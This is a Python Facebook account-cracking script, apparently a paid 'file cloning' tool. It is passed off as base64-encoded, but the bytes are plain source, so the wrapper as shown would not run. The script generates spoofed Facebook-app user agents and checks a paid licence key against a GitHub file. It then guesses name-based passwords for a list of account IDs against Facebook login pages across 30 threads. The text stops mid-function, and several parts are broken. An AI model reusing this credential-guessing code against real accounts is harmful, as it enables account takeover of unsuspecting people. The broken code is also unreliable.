# Encoded By : Mahadi Hasan Jihad
# Encryption : Py3 B64
# Github: https://github.com/mh-jihad404
#----------------------------------------------

import base64
exec(base64.b64decode(b'#JIHAD - _ - JIHAD _-_ON_-_FIRE !¡●●
from os import path
import os,base64,zlib,pip,urllib,time
print('[\033[1;32m✓\033[1;37m] Chec For Update !! ')
time.sleep(1.5)
print('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
time.sleep(1.5)
os.system('git pull')
os.system('clear')
print("\033[38;5;33m\n𝙏𝙊𝙊𝙇𝙎 𝙐𝙋𝘿𝘼𝙏𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇\n")
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/726963278345015/')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-N986N Build/ZK83T5) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]"}
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
        b=random.choice(['6','7','8','9','10','11','12',])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 9; Nokia C2 Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
for agent in range(10000):
        aa='Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='CPU iPhone OS 16_0 like Mac OS X'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/331.0.0.9.105;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      


        
       
def JIHADALWAYSONFIRE():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/Mh-Jihad404/J1HADDDDDDDD/blob/main/Approve.txt').text
  
 

  os.system(f" clear")                          
  print(f"""\t
\033[38;5;46m███    ███  █████  ██   ██  █████  ██████  ██ 
\033[38;5;46m████  ████ ██   ██ ██   ██ ██   ██ ██   ██ ██ 
\033[38;5;46m██ ████ ██ ███████ ███████ ███████ ██   ██ ██ 
\033[38;5;46m██  ██  ██ ██   ██ ██   ██ ██   ██ ██   ██ ██ 
\033[38;5;46m██      ██ ██   ██ ██   ██ ██   ██ ██████  ██  (J1HAD BoSs)

\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m╔══════════════════╗
\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑  \x1b[38;5;196m ║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗝1𝐇𝐀𝐃🔥           \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔥]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46mMAHADI HASAN JIHAD      \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔥]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01600253398     \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔥]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁   \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46mMh-Jihad404? \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔥]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01600253398     \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m V\033[38;5;46   VIRSION  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46m1.0     \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        \x1b[38;5;196m
\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")           
  print("Your Key : \033[1;32m"+id)                                
  print("\033[1;37mThis Tool Is Paid So Bye The Tol")
  print("Send Your Key WhatsApp")
  os.system('xdg-open https://facebook.com/groups/726963278345015/')
  time.sleep(1)
  print("\033[1;37mChecJIHAD Your Key")
  print("\033[38;5;46m7 DAY 200TK")
  print("\033[38;5;46m15 DAY 350TK")
  print("\033[38;5;46m30 DAY 500TK")
  try:
    httpCaht = requests.get(f"https://github.com/Mh-Jihad404/J1HADDDDDDDD/blob/main/Approve.txt").text
    if id in httpCaht:
      print("\033[1;32mCongratulations ! Your Key Is Approved");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:      
      print(f"This Tool Is Paid So Bye The Tol")
      print(f"Your Key Not Approved")
      print(f"Send Key For Access This Tool"); time.sleep(1)
      os.system(f'xdg-open {tan}://wa.me/+8801600253398?text='+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	JIHADALWAYSONFIRE()
#JIHADALWAYSONFIRE()

logo=(f"""
\033[38;5;46m███    ███  █████  ██   ██  █████  ██████  ██ 
\033[38;5;46m████  ████ ██   ██ ██   ██ ██   ██ ██   ██ ██ 
\033[38;5;46m██ ████ ██ ███████ ███████ ███████ ██   ██ ██ 
\033[38;5;46m██  ██  ██ ██   ██ ██   ██ ██   ██ ██   ██ ██ 
\033[38;5;46m██      ██ ██   ██ ██   ██ ██   ██ ██████  ██  (J1HAD BoSs)

\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m╔══════════════════╗
\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑  \x1b[38;5;196m ║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗝1𝐇𝐀𝐃🔥           \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔥]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46mMAHADI HASAN JIHAD      \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔥]\033[38;5;46m𝐖𝐇??𝐒𝐀𝐏𝐏 \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01600253398     \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔥]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁   \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46mMh-Jihad404? \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔥]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01600253398     \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m V\033[38;5;46 VIRSION     \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m║\033[38;5;46m1.0     \x1b[38;5;196m
\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        \x1b[38;5;196m
\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗝𝗜𝐇𝐀𝐃𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
def linex():
        print(47*'\033[1;31m▬\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]


			
def JIHAD():
	clear()
	#ckx()
	print(f" [\033[1;32mA\033[38;5;46m] 𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 [? 𝗙𝗨𝗟𝗟 𝙒𝙊𝙍𝙆𝙄𝙉𝙂] ")
	print(f" [\033[1;32m1\033[38;5;46m] 𝗝𝗢𝗜𝗡 𝗧𝗛𝗘 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗣𝗔𝗚𝗘") 
	print(f" [\033[1;31m0\033[38;5;46m] 𝗘𝗫𝗜𝗧")
	me=input(f' [\033[1;32m✓\033[38;5;46m] 𝗖𝗛𝗢𝗜𝗖𝗘 : ')
	if me in ["2", "02"]:
	    os.system('python RANDOM.py')
     
	#if me in ["3","03"]:
		#gml()
	if me in ["A", "01","11","A","a"]:
		clear()
		JIHAD = input(f' [\033[1;32m✓\033[1;37m] 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 [\033[1;32m❯\033[1;37m] ')
		try:
			fo = open(JIHAD,'r').read().splitlines()
		except JIHADNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] JIHAD location Not Found ')
			exit()
		print(f' [\033[1;31m1\033[1;37m] 𝗠𝗘𝗧𝗛𝗢𝗗 \033[1;32m1\033[1;37m [\033[1;32m𝗠𝗜𝗫 𝗜𝗗𝗦\033[1;37m] \n [\033[1;31m2\033[1;37m] 𝗠𝗘𝗧𝗛𝗢𝗗 \033[1;32m2\033[1;37m [\033[1;32m𝗠𝗘𝗫𝗜𝗖𝗢 Ids\033[1;37m] \n [\033[1;31m3\033[1;37m] 𝗠𝗘𝗧𝗛𝗢𝗗 \033[1;32m3\033[1;37m [\033[1;32m𝗜𝗡𝗗𝗜𝗔 𝗜𝗗𝗦\033[1;37m] \n [\033[1;31m4\033[1;37m] 𝗠𝗘𝗧𝗛𝗢𝗗 \033[1;32m4\033[1;37m [\033[1;32m𝗕𝗗 𝗜𝗗𝗦\033[1;37m]  ')
		mthd=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
		plist=[]
		try:
			ps_limit = int(input(f' [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add [\033[1;32m⟩\033[1;37m] '))
		except:
			ps_limit =1
		print(f' [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m✓\033[1;37m] Put password {i+1}[\033[1;32m❯\033[1;37m] '))
		print(f' [\033[1;32m?\033[1;37m] Do You Went Show CP IDs (y/n): ')
		cx=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(m2,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(m3,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(m4,ids,names,passlist)
				#elif mthd in ['5','05']:
					#crack_submit.submit(m5,ids,names,passlist)
				#elif mthd in ['6','06']:
					#crack_submit.submit(ffb4,ids,names,passlist)
				#elif mthd in ['7','07']:
					#crack_submit.submit(ffb7,ids,names,passlist)
				#elif mthd in ['8','08']:
					#crack_submit.submit(ffb8,ids,names,passlist)
				#else:
					#crack_submit.submit(m5,ids,names,passlist)
				
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [JIHAD] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
